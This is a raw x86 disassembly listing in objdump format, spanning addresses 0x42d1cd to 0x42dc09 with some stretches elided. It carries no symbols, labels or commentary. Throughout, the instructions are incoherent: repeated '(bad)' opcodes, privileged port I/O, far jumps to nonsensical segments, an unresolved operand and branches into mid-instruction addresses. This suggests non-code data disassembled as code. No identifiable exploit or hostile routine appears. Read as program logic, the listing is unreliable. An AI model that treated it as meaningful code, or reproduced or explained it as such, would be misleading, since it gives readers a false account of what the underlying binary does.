  42d1cd:	xor    bh,bl
  42d1cf:	push   esp
  42d1d0:	cmp    BYTE PTR [edx+0x5c1f52de],dl
  42d1d6:	ret    0x3a0d
  42d1d9:	push   edx
  42d1da:	sbb    al,0x77
  42d1dc:	outs   dx,BYTE PTR ds:[esi]
  42d1dd:	ins    DWORD PTR es:[edi],dx
  42d1de:	adc    ebx,esi
  42d1e0:	pop    ecx
  42d1e1:	dec    edi
  42d1e2:	leave  
  42d1e3:	test   eax,0x9c8e144b
  42d1e8:	loope  0x42d17c
  42d1ea:	daa    
  42d1eb:	push   es
  42d1ec:	inc    edi
  42d1ed:	cld    
  42d1ee:	test   DWORD PTR [esi-0x2b],esi
  42d1f1:	push   ss
  42d1f2:	adc    eax,0x85dd5916
  42d1f7:	xor    al,0x9f
  42d1f9:	enter  0x3629,0x28
  42d1fd:	sub    DWORD PTR [ebp-0x2a57dada],esi
  42d203:	push   eax
  42d204:	test   DWORD PTR [edi-0x3b70e3a0],ecx
  42d20a:	lods   eax,DWORD PTR ds:[esi]
  42d20b:	add    al,0x21
  42d20d:	jne    0x42d1f8
  42d20f:	sub    ebx,eax
  42d211:	mov    al,ds:0xaa599bba
  42d216:	hlt    
  42d217:	jno    0x42d1af
  42d219:	lods   al,BYTE PTR ds:[esi]
  42d21a:	adc    ebx,edi
  42d21c:	imul   edi,DWORD PTR [edx+0x38],0xffffffa6
  42d220:	dec    ebx
  42d221:	or     BYTE PTR ds:0x7756b998,dl
  42d227:	lods   eax,DWORD PTR ds:[esi]
  42d228:	dec    ecx
  42d229:	dec    eax
  42d22a:	mov    bl,0x3e
  42d22c:	inc    ebp
  42d22d:	ja     0x42d1b2
  42d22f:	into   
  42d230:	(bad)  
  42d231:	cdq    
  42d232:	fucomi st,st(5)
  42d234:	xlat   BYTE PTR ds:[ebx]
  42d235:	icebp  
  42d236:	xchg   ecx,eax
  42d237:	adc    ecx,DWORD PTR [edi]
  42d239:	jno    0x42d203
  42d23b:	test   al,0xdc
  42d23d:	jmp    0x2a:0x75a7360b
  42d244:	(bad)  
  42d245:	ret    0x61bc
  42d248:	stc    
  42d249:	popa   
  42d24a:	inc    edx
  42d24b:	cmc    
  42d24c:	rol    BYTE PTR [ebx],0xfb
  42d24f:	inc    ebx
  42d250:	in     eax,0xb6
  42d252:	popa   
  42d253:	mov    ah,0xc2
  42d255:	pop    esp
  42d256:	jmp    0x42d216
  42d258:	jecxz  0x42d2a8
  42d25a:	in     al,0x34
  42d25c:	lahf   
  42d25d:	repz test al,0xc6
  42d260:	neg    BYTE PTR [edx]
  42d262:	mov    esp,esi
  42d264:	sbb    dh,cl
  42d266:	mov    bl,0xb8
  42d268:	dec    eax
  42d269:	aad    0xf3
  42d26b:	pop    esi
  42d26c:	jbe    0x42d2d2
	...
  42d2d6:	lea    ecx,[eax]
  42d2d8:	pop    ebp
  42d2d9:	jbe    0x42d2b8
  42d2db:	ja     0x42d28c
  42d2dd:	sti    
  42d2de:	aaa    
  42d2df:	out    0x36,eax
  42d2e1:	ja     0x42d2d2
  42d2e3:	and    BYTE PTR [edx+0x1e467ae],0x0
  42d2ea:	add    BYTE PTR [ecx],al
  42d2ec:	add    BYTE PTR [eax],al
  42d2ee:	inc    ebx
  42d2ef:	jle    0x42d33e
  42d2f1:	into   
  42d2f2:	div    DWORD PTR [edi]
  42d2f4:	sub    edx,ecx
  42d2f6:	rcr    DWORD PTR [ebx+0x22],1
  42d2f9:	test   BYTE PTR [ebx-0x42],0x84
  42d2fd:	cmp    esp,DWORD PTR ds:0x53deff38
  42d303:	mov    edi,0x1e8e7231
  42d308:	ret    0xff48
  42d30b:	sbb    dl,bl
  42d30d:	adc    eax,0x31da57e5
  42d312:	out    dx,eax
  42d313:	pop    esi
  42d314:	or     al,0x3
  42d316:	push   ds
  42d317:	pop    edx
  42d318:	jmp    0x6467068b
  42d31d:	dec    eax
  42d31e:	ffreep st(1)
  42d320:	add    eax,0x13200ee7
  42d325:	loopne 0x42d309
  42d327:	cmp    ebp,edi
  42d329:	add    eax,0x6fe7a1bd
  42d32e:	ficom  WORD PTR [ebx]
  42d330:	push   edi
  42d331:	call   0x52a43794
  42d336:	dec    esp
  42d337:	dec    ecx
  42d338:	push   esi
  42d339:	mov    ah,0x12
  42d33b:	ret    0xd070
  42d33e:	clc    
  42d33f:	pop    edi
  42d340:	mov    ah,0x45
  42d342:	jbe    0x42d2d8
  42d344:	fld    TBYTE PTR [ebx]
  42d346:	mov    BYTE PTR [ecx+esi*8-0x46],dl
  42d34a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d34b:	xor    edx,DWORD PTR [edx]
  42d34d:	je     0x42d301
  42d34f:	js     0x42d3a7
  42d351:	sbb    DWORD PTR [si-0x609],eax
  42d356:	test   edi,edi
  42d358:	adc    eax,0x27ea876f
  42d35d:	sub    eax,0xd27d8ba0
  42d362:	push   ss
  42d363:	push   DWORD PTR [esi+0x17]
  42d366:	repnz sbb dl,BYTE PTR [edx]
  42d369:	call   0xb9d42000
  42d36e:	lea    edx,[ecx-0xb]
  42d371:	mov    dl,0x3c
  42d373:	jp     0x42d3a6
  42d375:	fcomp  DWORD PTR [ecx]
  42d377:	mov    cl,0x60
  42d379:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d37a:	mov    ah,0xf2
  42d37c:	or     eax,0xf92a5e4d
  42d381:	mov    bh,0x39
  42d383:	push   edi
  42d384:	push   edx
  42d385:	xchg   esp,eax
  42d386:	repnz test al,0x2e
  42d389:	pop    ebp
  42d38a:	dec    eax
  42d38b:	fcom   QWORD PTR [ebx-0x21331666]
  42d391:	rcr    BYTE PTR [edx+0x55],0xce
  42d395:	inc    esi
  42d396:	sub    al,0x82
  42d398:	imul   ebp,DWORD PTR [edi],0x6b
  42d39b:	push   edx
  42d39c:	shr    edx,0xb9
  42d39f:	cs retf 
  42d3a1:	mov    eax,0xd0a953ca
  42d3a6:	not    cl
  42d3a8:	sbb    esi,eax
  42d3aa:	jmp    0x42d365
  42d3ac:	fidivr DWORD PTR [ebp-0x3b7f3606]
  42d3b2:	sub    esp,DWORD PTR [eax-0x4a]
  42d3b5:	and    eax,0xdaf909e4
  42d3ba:	out    0x41,eax
  42d3bc:	xchg   ebx,eax
  42d3bd:	sub    DWORD PTR [ecx-0x55644f69],eax
  42d3c3:	and    BYTE PTR [ebx-0x61],cl
  42d3c6:	aam    0xa5
  42d3c8:	sar    BYTE PTR [ebx+0x4332f0b2],1
  42d3ce:	into   
  42d3cf:	jne    0x42d3eb
  42d3d1:	xchg   edx,eax
  42d3d2:	xor    DWORD PTR [eax+0x14],esp
  42d3d5:	or     BYTE PTR [edx+edx*1],ah
  42d3d8:	add    BYTE PTR [edx+edx*1],al
  42d3db:	cmp    DWORD PTR [ecx-0x46],0xffffffb6
  42d3df:	out    0x64,eax
  42d3e1:	pop    edi
  42d3e2:	int3   
  42d3e3:	cmp    ebx,eax
  42d3e5:	stos   DWORD PTR es:[edi],eax
  42d3e6:	jns    0x42d377
  42d3e8:	jmp    0x95:0x185f4f54
	...
  42d453:	add    BYTE PTR [eax],al
  42d455:	add    cl,al
  42d457:	into   
  42d458:	arpl   WORD PTR [ecx-0x21044291],bx
  42d45e:	pop    ecx
  42d45f:	xchg   esp,eax
  42d460:	aaa    
  42d461:	pushf  
  42d462:	push   0x67964f06
  42d467:	in     eax,0x1
  42d469:	add    BYTE PTR [eax],al
  42d46b:	add    DWORD PTR [eax],eax
  42d46d:	add    BYTE PTR [ebp-0x4ee8c77a],dl
  42d473:	pop    esi
  42d474:	popa   
  42d475:	ret    0x23a8
  42d478:	outs   dx,BYTE PTR ds:[esi]
  42d479:	popf   
  42d47a:	clc    
  42d47b:	sub    dl,BYTE PTR [esi-0x4dbc2b7d]
  42d481:	xchg   edx,eax
  42d482:	in     eax,dx
  42d483:	dec    ecx
  42d484:	add    esi,ecx
  42d486:	jae    0x42d48e
  42d488:	jge    0x42d4e3
  42d48a:	xor    BYTE PTR [eax],ch
  42d48c:	lods   al,BYTE PTR ds:[esi]
  42d48d:	ins    DWORD PTR es:[edi],dx
  42d48e:	mov    ds:0xc3afc4f8,eax
  42d493:	push   es
  42d494:	sub    edi,edi
  42d496:	ja     0x42d46f
  42d498:	mov    al,0x5f
  42d49a:	rcr    DWORD PTR [eax+0x6b],0xbc
  42d49e:	adc    edx,eax
  42d4a0:	xchg   edi,eax
  42d4a1:	pop    edx
  42d4a2:	(bad)  
  42d4a3:	cmc    
  42d4a4:	rol    dl,1
  42d4a6:	jmp    0xd08e1fcc
  42d4ab:	xor    DWORD PTR [ebx-0x4c],esi
  42d4ae:	lea    ebp,[esi+0x2ab056cd]
  42d4b4:	nop
  42d4b5:	inc    DWORD PTR [ebp+0xd7e560f]
  42d4bb:	rol    BYTE PTR [eax+0x7a],0x6
  42d4bf:	jle    0x42d4f0
  42d4c1:	out    dx,eax
  42d4c2:	fisubr DWORD PTR [esi]
  42d4c4:	rcr    bl,1
  42d4c6:	in     al,0x98
  42d4c8:	add    al,BYTE PTR [eax]
  42d4ca:	or     al,0xee
  42d4cc:	jmp    0x92d3:0xf0e94e3c
  42d4d3:	ret    
  42d4d4:	popa   
  42d4d5:	or     esp,DWORD PTR [edi-0x29844be7]
  42d4db:	push   ecx
  42d4dc:	popf   
  42d4dd:	imul   esi,DWORD PTR ds:0x9bfefcc2,0x9dc24827
  42d4e7:	inc    eax
  42d4e8:	or     BYTE PTR [ecx],ah
  42d4ea:	cs loop 0x42d4bb
  42d4ed:	add    eax,0x962768e7
  42d4f2:	adc    ebx,DWORD PTR [eax-0x286aa6d1]
  42d4f8:	shl    BYTE PTR [edx-0x71],cl
  42d4fb:	mov    cl,0x5
  42d4fd:	mov    dh,0x93
  42d500:	pop    edx
  42d501:	and    al,0xe3
  42d503:	xor    esi,DWORD PTR [eax]
  42d505:	jne    0x42d502
  42d507:	inc    edi
  42d508:	out    0x6e,eax
  42d50a:	retf   0xd8c9
  42d50d:	rcr    dh,cl
  42d50f:	je     0x42d4c2
  42d511:	sub    DWORD PTR [eax+edx*1-0x26],ebx
  42d515:	shr    BYTE PTR [edi+edi*1+0x2],1
  42d519:	or     eax,DWORD PTR [edi]
  42d51b:	gs jmp 0xb31:0x77d333df
  42d523:	lea    esp,[edi]
  42d525:	push   ecx
  42d526:	or     eax,0x6908cfb6
  42d52b:	sub    bh,ch
  42d52d:	cld    
  42d52e:	out    0x8f,al
  42d530:	jecxz  0x42d509
  42d532:	and    eax,0xc921bd57
  42d537:	test   al,0xde
  42d539:	cmp    eax,0xe1fab4e1
  42d53e:	sti    
  42d53f:	imul   esp,ebp,0x3f
  42d542:	outs   dx,BYTE PTR ds:[esi]
  42d543:	cmc    
  42d544:	shl    BYTE PTR [edx-0x2e97c9ae],1
  42d54a:	(bad)  
  42d54b:	dec    esp
  42d54c:	mov    esi,0xc90f6b5a
  42d551:	(bad)  
  42d552:	mov    esi,0xbd940ae8
  42d557:	sbb    ch,BYTE PTR [eax-0x43]
  42d55a:	scas   eax,DWORD PTR es:[edi]
  42d55b:	and    BYTE PTR [eax+0x27b1df25],cl
  42d561:	imul   eax,DWORD PTR [ecx],0xffffffda
  42d564:	js     0x42d578
  42d566:	push   ss
  42d567:	jne    0x42d533
  42d569:	das    
  42d56a:	push   ecx
  42d56b:	jnp    0x42d52f
  42d56d:	popf   
	...
  42d5d6:	cdq    
  42d5d7:	cmc    
  42d5d8:	adc    BYTE PTR [ebx-0x12],0x77
  42d5dc:	fcos   
  42d5de:	pop    ebp
  42d5df:	mov    ds:0xb89289d5,eax
  42d5e5:	push   0x1e667
  42d5ea:	add    BYTE PTR [ecx],al
  42d5ec:	add    BYTE PTR [eax],al
  42d5ee:	dec    ebp
  42d5ef:	jmp    0x8c8f27b7
  42d5f4:	push   edi
  42d5f5:	mov    DWORD PTR [eax+0x24f806fa],esi
  42d5fb:	out    0x3a,eax
  42d5fd:	outs   dx,DWORD PTR ds:[esi]
  42d5fe:	dec    edx
  42d5ff:	ja     0x42d668
  42d601:	jle    0x42d5ed
  42d603:	mov    ds:0x68edab14,al
  42d608:	(bad)  
  42d609:	shr    DWORD PTR [ebx+0x5ca210e0],1
  42d60f:	fst    st(7)
  42d611:	fisttp WORD PTR [ebp+0x7ce35da]
  42d617:	mov    eax,ds:0x8a79d4ba
  42d61c:	or     eax,0xf06160d8
  42d621:	add    cl,dl
  42d623:	retf   
  42d624:	jp     0x42d5e2
  42d626:	add    eax,0x7235bfd0
  42d62b:	jp     0x42d5b2
  42d62d:	cmp    eax,0xf54c358d
  42d632:	in     al,0xd5
  42d634:	cwde   
  42d635:	sbb    BYTE PTR [ebx+0x5b],bh
  42d638:	pop    esp
  42d639:	sub    al,0x6f
  42d63b:	push   esi
  42d63c:	mov    al,0xab
  42d63e:	div    BYTE PTR [ecx-0xb]
  42d641:	fdivr  QWORD PTR [edi]
  42d643:	jns    0x42d5fb
  42d645:	jne    0x42d643
  42d647:	xchg   esp,eax
  42d648:	shl    BYTE PTR [edx-0x2b967861],cl
  42d64e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d64f:	push   edi
  42d650:	jbe    0x42d659
  42d652:	test   ch,dh
  42d654:	popa   
  42d655:	add    eax,0xd5aed9aa
  42d65a:	adc    ch,cl
  42d65c:	dec    eax
  42d65d:	inc    esi
  42d65e:	in     eax,dx
  42d65f:	push   cs
  42d660:	dec    ecx
  42d661:	repnz adc bl,BYTE PTR [edx]
  42d664:	and    BYTE PTR [ebp+0x30430913],ah
  42d66a:	addr16 ja 0x42d644
  42d66d:	pop    esp
  42d66e:	dec    ebx
  42d66f:	inc    eax
  42d670:	and    DWORD PTR [ecx],0xffffff8d
  42d673:	retf   0x7d0b
  42d676:	sub    eax,0x16485c11
  42d67b:	in     eax,0x2
  42d67d:	jns    0x42d6c7
  42d67f:	stos   DWORD PTR es:[edi],eax
  42d680:	idiv   BYTE PTR [esi+0x5d]
  42d683:	mov    esi,DWORD PTR [edi-0x32]
  42d686:	push   0xffffff91
  42d688:	outs   dx,BYTE PTR ds:[esi]
  42d689:	mov    eax,0x46c9ee08
  42d68e:	aas    
  42d68f:	sub    ch,BYTE PTR [ecx]
  42d691:	mov    ch,BYTE PTR [ebx+0x78]
  42d694:	jnp    0x42d6b2
  42d696:	clc    
  42d697:	bound  esp,QWORD PTR [ecx+0x517326ff]
  42d69d:	sub    BYTE PTR [ecx-0x2e],bh
  42d6a0:	jae    0x42d6e9
  42d6a2:	xchg   ebp,eax
  42d6a3:	jbe    0x42d62c
  42d6a5:	inc    eax
  42d6a6:	scas   al,BYTE PTR es:[edi]
  42d6a7:	retf   0xdd77
  42d6aa:	repnz mov cl,0x6b
  42d6ad:	dec    cl
  42d6af:	or     bl,BYTE PTR [edi+0x4b]
  42d6b2:	imul   edi,esi,0xffffffd0
  42d6b5:	xchg   esi,eax
  42d6b6:	xlat   BYTE PTR ds:[ebx]
  42d6b7:	push   ebx
  42d6b8:	cld    
  42d6b9:	imul   esp,DWORD PTR [edx-0x57],0xebba7f39
  42d6c0:	je     0x42d69d
  42d6c2:	iret   
  42d6c3:	mov    bh,0xc3
  42d6c5:	enter  0x797,0x35
  42d6c9:	in     eax,0x5f
  42d6cb:	fs or  al,0x50
  42d6ce:	and    eax,0x1afdf8ea
  42d6d3:	fidiv  DWORD PTR [ebx+0x5c]
  42d6d6:	nop
  42d6d7:	(bad)  
  42d6d9:	cmp    dh,0xa1
  42d6dc:	loop   0x42d70c
  42d6de:	push   0xffffffdb
  42d6e0:	adc    BYTE PTR [edx-0x6cb3c61],ah
  42d6e6:	fs add al,0xb9
  42d6e9:	lock shl ch,1
  42d6ec:	pop    ebp
  42d6ed:	sti    
	...
  42d756:	repz add esp,DWORD PTR [eax]
  42d759:	(bad)  
  42d75a:	lock scas eax,DWORD PTR es:[edi]
  42d75c:	(bad)  
  42d75d:	jg     0x42d6e0
  42d75f:	in     al,0x2c
  42d761:	and    al,0x1b
  42d763:	pop    edx
  42d764:	daa    
  42d765:	jne    0x42d7ce
  42d767:	out    0x1,eax
  42d769:	add    BYTE PTR [eax],al
  42d76b:	add    DWORD PTR [eax],eax
  42d76d:	add    dl,cl
  42d76f:	pop    eax
  42d770:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d771:	stc    
  42d772:	jno    0x42d70e
  42d774:	pop    ss
  42d775:	sbb    DWORD PTR [edx+0x7555726f],0x48622ef3
  42d77f:	retf   0x596
  42d782:	adc    eax,0x352d390
  42d787:	push   ebp
  42d788:	push   0xb
  42d78a:	cmp    ebp,DWORD PTR [edi+0x6d]
  42d78d:	xor    BYTE PTR [edx],cl
  42d78f:	cmp    eax,0xc420a4be
  42d794:	loop   0x42d7b8
  42d796:	sbb    BYTE PTR [edx],bh
  42d798:	cmp    eax,0x6910f56e
  42d79d:	pushf  
  42d79e:	mov    al,0xba
  42d7a0:	add    al,0x96
  42d7a2:	in     al,dx
  42d7a3:	mov    cl,ch
  42d7a5:	mov    edx,DWORD PTR ss:[edx+ecx*4]
  42d7a9:	xchg   esp,ebx
  42d7ab:	aam    0x36
  42d7ad:	fmul   QWORD PTR [ebx-0x7e]
  42d7b0:	push   bp
  42d7b2:	jmp    0x5ea1:0xe80f5a63
  42d7b9:	pusha  
  42d7ba:	adc    WORD PTR [ebx+esi*1-0x2eb33f72],0xf6c8
  42d7c4:	(bad)
  42d7c7:	push   cs
  42d7c8:	loop   0x42d845
  42d7ca:	mov    BYTE PTR [edx-0x2c9995cd],al
  42d7d0:	xlat   BYTE PTR ds:[ebx]
  42d7d1:	int    0xcd
  42d7d3:	(bad)  
  42d7d4:	cmp    ebp,ebp
  42d7d6:	ja     0x42d842
  42d7d8:	clc    
  42d7d9:	(bad)  
  42d7da:	ja     0x42d789
  42d7dc:	dec    esi
  42d7dd:	xchg   ebp,eax
  42d7de:	adc    al,0xe5
  42d7e0:	data16 jns 0x42d813
  42d7e3:	cmp    DWORD PTR [eax],ebx
  42d7e5:	popf   
  42d7e6:	mov    al,ds:0x776d5e6
  42d7eb:	mov    ebp,0x1ea121b6
  42d7f0:	mov    bl,BYTE PTR [edx]
  42d7f2:	fbld   TBYTE PTR [ecx+0x521c4f5c]
  42d7f8:	add    BYTE PTR [eax-0x33],dl
  42d7fb:	je     0x42d7ba
  42d7fd:	mov    bh,0x3f
  42d7ff:	test   BYTE PTR [edi-0xfd8f17],dl
  42d805:	push   esi
  42d806:	loopne 0x42d822
  42d808:	sbb    bl,ah
  42d80a:	pusha  
  42d80b:	xchg   edx,eax
  42d80c:	sub    DWORD PTR [esi+0xf],0x191f70b7
  42d813:	cli    
  42d814:	in     eax,0xcd
  42d816:	pushf  
  42d817:	sahf   
  42d818:	mov    ch,0xda
  42d81a:	push   ebp
  42d81b:	loop   0x42d881
  42d81d:	scas   al,BYTE PTR es:[edi]
  42d81e:	mov    ecx,0xe5a2bb8b
  42d823:	and    BYTE PTR [eax],al
  42d825:	test   DWORD PTR [ebp+0x59],esp
  42d828:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d829:	add    esi,eax
  42d82b:	iret   
  42d82c:	or     eax,0xf8382b4
  42d831:	adc    eax,0xedb0fc06
  42d836:	rcl    DWORD PTR [esi],cl
  42d838:	test   BYTE PTR [ecx-0x28e770ea],ah
  42d83e:	cmp    ch,BYTE PTR ds:0x883c379c
  42d844:	bound  ebx,QWORD PTR [esi-0x45]
  42d847:	ds push ebp
  42d849:	lods   eax,DWORD PTR ds:[esi]
  42d84a:	and    ebx,DWORD PTR [ecx-0x72]
  42d84d:	dec    ebx
  42d84e:	and    ah,bl
  42d850:	fmul   QWORD PTR [edi+eiz*4+0xf]
  42d854:	test   al,0xd2
  42d856:	imul   ecx
  42d858:	mov    esp,DWORD PTR [edx-0x1c209470]
  42d85e:	jae    0x42d822
  42d860:	pop    edi
  42d861:	cmp    ebp,DWORD PTR [ebx]
  42d863:	in     eax,0xda
  42d865:	inc    esi
  42d866:	addr16 push ebp
  42d868:	push   ecx
  42d869:	cs cmp ecx,ebp
  42d86c:	push   cs
  42d86d:	xchg   edi,eax
	...
  42d8d6:	xchg   esi,eax
  42d8d7:	fwait
  42d8d8:	cwde   
  42d8d9:	pop    edi
  42d8da:	popf   
  42d8db:	pop    edi
  42d8dc:	xlat   BYTE PTR ds:[ebx]
  42d8dd:	fistp  DWORD PTR ds:0x9dc6961a
  42d8e3:	rcr    BYTE PTR [edx-0x5c],1
  42d8e6:	addr16 call 0x142d8ed
  42d8ec:	add    BYTE PTR [eax],al
  42d8ee:	test   al,0xbc
  42d8f0:	std    
  42d8f1:	mov    ch,0x4a
  42d8f3:	nop
  42d8f4:	add    sp,WORD PTR [edx-0x4be822d8]
  42d8fb:	jns    0x42d8bb
  42d8fd:	ins    BYTE PTR es:[edi],dx
  42d8fe:	cmp    eax,0xc3a6ddef
  42d903:	inc    edx
  42d904:	stos   DWORD PTR es:[edi],eax
  42d905:	cld    
  42d906:	out    0x71,al
  42d908:	sahf   
  42d909:	mov    ebx,0x56460306
  42d90e:	jmp    0x42d8a6
  42d910:	mov    al,0xcc
  42d912:	retf   0x96f7
  42d915:	in     eax,dx
  42d916:	out    0xf9,eax
  42d918:	fst    QWORD PTR ds:0xabe9db1d
  42d91e:	je     0x42d919
  42d920:	sub    al,0xc0
  42d922:	inc    esi
  42d923:	bound  ebp,QWORD PTR [eax-0x54e493ac]
  42d929:	dec    ebx
  42d92a:	js     0x42d97f
  42d92c:	out    0xe5,al
  42d92e:	mov    DWORD PTR [ecx+ebp*2+0x3ef4c169],0xc1beada5
  42d939:	dec    ebx
  42d93a:	pop    esi
  42d93b:	jo     0x42d8eb
  42d93d:	dec    edi
  42d93e:	popf   
  42d93f:	fisub  DWORD PTR [edx]
  42d941:	int    0x51
  42d943:	ret    0x1b34
  42d946:	out    0x41,al
  42d948:	push   ebp
  42d949:	dec    ebx
  42d94a:	cmp    DWORD PTR [ebx+edx*8+0x30],0x1635a1d8
  42d952:	cmp    DWORD PTR [edi],eax
  42d954:	mov    esp,0x6ba4927
  42d959:	xchg   edx,eax
  42d95a:	mov    esp,0x3c0e37fe
  42d95f:	or     edx,DWORD PTR [ecx-0xc]
  42d962:	pop    ss
  42d963:	jne    0x42d995
  42d965:	jb     0x42d90d
  42d967:	clc    
  42d968:	cmp    cl,ah
  42d96a:	ja     0x42d9e2
  42d96c:	or     BYTE PTR [eax-0x5b],0x67
  42d970:	outs   dx,BYTE PTR ds:[esi]
  42d971:	mov    al,0x9c
  42d973:	sub    bh,dh
  42d975:	cmp    BYTE PTR ds:0xdc7e20d4,bl
  42d97b:	sbb    eax,0xd5d3bb56
  42d980:	jg     0x42d99b
  42d982:	mov    bh,0xbf
  42d984:	es scas eax,DWORD PTR es:[edi]
  42d986:	mov    dl,0x5f
  42d988:	mov    bl,0xc9
  42d98a:	into   
  42d98b:	sub    eax,0xfe87232f
  42d990:	xchg   esp,eax
  42d991:	jns    0x42d979
  42d993:	test   BYTE PTR [edi],bl
  42d995:	test   eax,ebx
  42d997:	xor    al,0x56
  42d999:	in     al,dx
  42d99a:	out    dx,eax
  42d99b:	ja     0x42d929
  42d99d:	test   DWORD PTR ds:0xf4fd0c7f,0x15d480a8
  42d9a7:	inc    eax
  42d9a8:	and    eax,0xadd66215
  42d9ad:	add    al,0x1f
  42d9af:	cmp    ecx,esi
  42d9b1:	sbb    DWORD PTR [esi+0x29],eax
  42d9b4:	(bad)  
  42d9b5:	test   BYTE PTR [ebx+ecx*2],bl
  42d9b8:	add    al,0x5f
  42d9ba:	inc    eax
  42d9bb:	cmp    eax,DWORD PTR [edx]
  42d9bd:	shl    BYTE PTR [ebx-0x1],1
  42d9c0:	dec    edx
  42d9c1:	rcr    DWORD PTR ds:0x86448364,cl
  42d9c7:	lock mov edx,0x5c521886
  42d9cd:	fcomp  DWORD PTR [edi+eiz*1]
  42d9d0:	repz in al,dx
  42d9d2:	push   esi
  42d9d3:	dec    ebx
  42d9d4:	cs pop ss
  42d9d6:	mov    cl,0x9d
  42d9d8:	shr    DWORD PTR [ecx+eax*1-0x52ba390f],1
  42d9df:	jmp    0x42da17
  42d9e1:	cmc    
  42d9e2:	xchg   edx,esi
  42d9e4:	push   es
  42d9e5:	cdq    
  42d9e6:	jo     0x42d9f2
  42d9e8:	adc    al,0xbd
  42d9ea:	ja     0x42d9e9
  42d9ec:	mov    bl,0xe5
	...
  42da56:	stc    
  42da57:	mov    cl,0x70
  42da59:	dec    eax
  42da5a:	js     0x42da25
  42da5c:	stc    
  42da5d:	mov    cl,0xbf
  42da5f:	dec    edi
  42da60:	int    0xe1
  42da62:	fimul  WORD PTR [edi-0x1698dabf]
  42da68:	add    DWORD PTR [eax],eax
  42da6a:	add    BYTE PTR [ecx],al
  42da6c:	add    BYTE PTR [eax],al
  42da6e:	dec    ebp
  42da6f:	aas    
  42da70:	aad    0x2f
  42da72:	rcl    esp,cl
  42da74:	xor    cl,BYTE PTR [edi]
  42da76:	pop    ebx
  42da77:	mov    esp,0x4b176e6
  42da7c:	bound  ecx,QWORD PTR [edi-0x2a]
  42da7f:	xchg   edx,eax
  42da80:	shl    BYTE PTR [ecx+esi*8],0x14
  42da84:	or     BYTE PTR [ebp+0x3305afcc],cl
  42da8a:	shr    ah,1
  42da8c:	lock inc edx
  42da8e:	fsub   QWORD PTR [edx+ebx*1]
  42da91:	aaa    
  42da92:	push   cs
  42da93:	addr16 loopne 0x42da26
  42da96:	push   DWORD PTR [ecx]
  42da98:	add    BYTE PTR [eax],cl
  42da9a:	mov    bh,0xcb
  42da9c:	sub    BYTE PTR [edx-0x3f585ca3],bl
  42daa2:	test   eax,0x592baf23
  42daa7:	cmp    al,0x65
  42daa9:	mov    al,0xb6
  42daab:	pop    esp
  42daac:	add    eax,0x42ec00bf
  42dab1:	push   ebp
  42dab2:	iret   
  42dab3:	dec    esi
  42dab4:	enter  0xa0b9,0xf
  42dab8:	cmp    ebx,DWORD PTR [ebx-0x7bd4b0fa]
  42dabe:	mov    esi,0x69fb6ddd
  42dac3:	ja     0x42db18
  42dac5:	aaa    
  42dac6:	push   0xffffff9a
  42dac8:	sbb    eax,0x9ea38465
  42dacd:	pushf  
  42dace:	lahf   
  42dacf:	add    edx,ebx
  42dad1:	push   esi
  42dad2:	mov    bl,0x18
  42dad4:	jns    0x42da64
  42dad6:	mov    ebp,0x8539e55c
  42dadb:	(bad)  
  42dadc:	push   edi
  42dadd:	xor    DWORD PTR [edi-0x17],edx
  42dae0:	xchg   BYTE PTR [eax],dh
  42dae2:	adc    eax,DWORD PTR [esi-0x2e]
  42dae5:	aad    0x41
  42dae7:	mov    ?,WORD PTR [edi+ebx*1]
  42daea:	js     0x42da8b
  42daec:	test   eax,0x7b0ffb5c
  42daf1:	dec    esi
  42daf2:	lods   al,BYTE PTR ds:[esi]
  42daf3:	arpl   WORD PTR [edi+ebx*1+0x11],ax
  42daf7:	int    0xd1
  42daf9:	sahf   
  42dafa:	add    ch,al
  42dafc:	pop    ebx
  42dafd:	dec    edx
  42dafe:	aad    0xd3
  42db00:	mov    al,0x9e
  42db02:	add    DWORD PTR [ebp+0x4f],0xffffffef
  42db06:	cmp    DWORD PTR [eax-0x68da1e28],eax
  42db0c:	pop    edi
  42db0d:	stos   DWORD PTR es:[edi],eax
  42db0e:	popa   
  42db0f:	(bad)  
  42db10:	arpl   bp,di
  42db12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42db13:	sub    al,0x9e
  42db15:	shl    al,1
  42db17:	sbb    ecx,DWORD PTR ds:0x184b42dc
  42db1d:	popa   
  42db1e:	fidiv  DWORD PTR [edx+0x628df09]
  42db24:	xor    BYTE PTR [ebp+0x6f7d54d5],cl
  42db2a:	dec    ebp
  42db2b:	test   DWORD PTR [eax],edx
  42db2d:	fnsave [esp+ebx*8]
  42db30:	inc    edi
  42db31:	mov    DWORD PTR [ecx+0x24ddbd0e],eax
  42db37:	rol    DWORD PTR [edx+0x72],cl
  42db3a:	xchg   esi,eax
  42db3b:	mov    dh,BYTE PTR [eax-0x22]
  42db3e:	cli    
  42db3f:	xor    BYTE PTR [edi+0x35a43d26],0x25
  42db46:	mov    edi,0xa0e0169a
  42db4b:	jno    0x42db6a
  42db4d:	lea    ebx,[ebp-0x2dec4056]
  42db53:	shr    DWORD PTR [edi],cl
  42db55:	xchg   esp,eax
  42db56:	push   0x25453787
  42db5b:	arpl   WORD PTR ds:0xf91c5fc7,dx
  42db61:	adc    eax,0x49b800f2
  42db66:	js     0x42db6e
  42db68:	xlat   BYTE PTR ds:[ebx]
  42db69:	call   DWORD PTR [edi-0x48]
  42db6c:	fild   QWORD PTR [eax+eax*1+0x0]
	...
  42dbd3:	add    BYTE PTR [eax],al
  42dbd5:	add    BYTE PTR [eax-0x2093e086],dh
  42dbdb:	ins    DWORD PTR es:[edi],dx
  42dbdc:	repz (bad) 
  42dbde:	fwait
  42dbdf:	jns    0x42db7c
  42dbe1:	jns    0x42dc4b
  42dbe3:	inc    edi
  42dbe4:	mov    ecx,0x1ea67ab
  42dbe9:	add    BYTE PTR [eax],al
  42dbeb:	add    DWORD PTR [eax],eax
  42dbed:	add    BYTE PTR [edi],ch
  42dbef:	sbb    eax,0x170942dd
  42dbf4:	lods   al,BYTE PTR ds:[esi]
  42dbf5:	mov    eax,0x5ae61e22
  42dbfa:	sbb    BYTE PTR [eax-0x6d],dl
  42dbfd:	xlat   BYTE PTR ds:[ebx]
  42dbfe:	xor    esp,DWORD PTR [ebp+ecx*2-0x74]
  42dc02:	add    eax,0xa83fb8e1
  42dc07:	push   ecx
  42dc08:	pop    ecx
  42dc09:	cmp    al,0xcd
